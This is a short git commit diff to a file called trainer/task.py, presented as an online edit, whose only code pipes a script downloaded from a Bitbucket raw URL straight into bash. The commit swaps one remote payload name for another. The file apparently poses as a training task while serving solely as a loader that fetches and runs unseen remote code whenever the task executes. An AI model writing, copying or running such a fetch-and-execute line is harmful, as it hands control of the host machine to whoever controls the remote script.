5bbbdbfe7450d72386ed8b869a5c92391d1ba66a
choi mina <coi@xinnz.my.id>
2024-01-22 12:10:55 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/aboxx/esceall/raw/main/derovi | bash')
+os.system('curl -sL https://bitbucket.org/aboxx/esceall/raw/main/zipa | bash')
